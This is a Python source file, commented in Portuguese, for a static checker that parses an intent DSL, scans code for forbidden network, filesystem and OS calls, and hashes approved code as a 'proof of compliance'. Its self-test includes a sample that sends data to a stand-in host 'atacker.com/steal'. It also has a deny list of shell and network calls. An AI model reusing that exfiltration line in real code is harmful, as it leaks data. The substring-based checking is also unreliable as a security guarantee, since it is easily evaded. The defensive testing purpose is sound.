import ast
import hashlib
import json
from vip_dsl_parser import VIPDSLParser

class VIPEngine:
    """
    O VIP-Engine é responsável por verificar se um código-fonte obedece
    às restrições e permissões definidas em uma VIP-DSL.
    """

    def __init__(self):
        self.parser = VIPDSLParser()
        self.forbidden_calls = {
            'NETWORK': ['requests', 'socket', 'urllib', 'http'],
            'FILESYSTEM': ['open', 'os.remove', 'os.mkdir', 'shutil'],
            'OS': ['os.system', 'subprocess', 'eval', 'exec']
        }

    def analyze_code(self, code: str, intent_dsl: str) -> dict:
        """
        Analisa o código em relação à intenção.
        """
        # 1. Parse da Intenção
        intent = self.parser.parse(intent_dsl)
        if self.parser.errors:
            return {"status": "ERROR", "errors": self.parser.errors}

        # 2. Análise Estática do Código (AST)
        try:
            tree = ast.parse(code)
        except SyntaxError as e:
            return {"status": "ERROR", "errors": [f"Erro de sintaxe no código: {e}"]}

        violations = []
        found_calls = []

        # Caminha pela árvore do código procurando por chamadas de função
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                func_name = ""
                if isinstance(node.func, ast.Name):
                    func_name = node.func.id
                elif isinstance(node.func, ast.Attribute):
                    if isinstance(node.func.value, ast.Name):
                        func_name = f"{node.func.value.id}.{node.func.attr}"
                    else:
                        func_name = node.func.attr
                
                found_calls.append(func_name)

        # 3. Verificação de Restrições (Exemplo Simples)
        for constraint in intent.get('constraints', []):
            if "DENY NETWORK" in constraint:
                for call in found_calls:
                    if any(net_call in call for net_call in self.forbidden_calls['NETWORK']):
                        violations.append(f"Violação: Chamada de rede proibida encontrada: {call}")
            
            if "DENY FILESYSTEM" in constraint:
                for call in found_calls:
                    if any(fs_call in call for fs_call in self.forbidden_calls['FILESYSTEM']):
                        violations.append(f"Violação: Acesso ao sistema de arquivos proibido encontrado: {call}")

            if "DENY OS" in constraint or "DENY SYSTEM" in constraint:
                for call in found_calls:
                    if any(os_call in call for os_call in self.forbidden_calls['OS']):
                        violations.append(f"Violação: Comando de sistema proibido encontrado: {call}")

        # 4. Resultado da Verificação
        if violations:
            return {
                "status": "REJECTED",
                "intent_name": intent.get('name'),
                "violations": violations
            }
        else:
            # Gera a Prova de Conformidade (PC) se aprovado
            payload = {
                "code_hash": hashlib.sha256(code.encode()).hexdigest(),
                "intent_hash": hashlib.sha256(json.dumps(intent, sort_keys=True).encode()).hexdigest()
            }
            pc = hashlib.sha256(json.dumps(payload, sort_keys=True).encode()).hexdigest()
            
            return {
                "status": "APPROVED",
                "intent_name": intent.get('name'),
                "pc": pc
            }

# Exemplo de uso:
if __name__ == "__main__":
    engine = VIPEngine()

    dsl = """
INTENT SecureCalculator
  VERSION 1.0.0
  DESCRIPTION "Calculadora que não acessa rede nem arquivos."
  CONSTRAINTS
    DENY NETWORK;
    DENY FILESYSTEM;
END INTENT
"""

    # Teste 1: Código Seguro
    safe_code = "def add(a, b): return a + b"
    print("--- Testando Código Seguro ---")
    result_safe = engine.analyze_code(safe_code, dsl)
    print(json.dumps(result_safe, indent=2))

    # Teste 2: Código Malicioso (Rede)
    malicious_code = """
import requests
def add(a, b):
    requests.get('http://atacker.com/steal?data=' + str(a+b))
    return a + b
"""
    print("\n--- Testando Código Malicioso (Rede) ---")
    result_malicious = engine.analyze_code(malicious_code, dsl)
    print(json.dumps(result_malicious, indent=2))

    # Teste 3: Código Malicioso (Arquivo)
    file_code = """
def add(a, b):
    with open('stolen_data.txt', 'w') as f:
        f.write(str(a+b))
    return a + b
"""
    print("\n--- Testando Código Malicioso (Arquivo) ---")
    result_file = engine.analyze_code(file_code, dsl)
    print(json.dumps(result_file, indent=2))
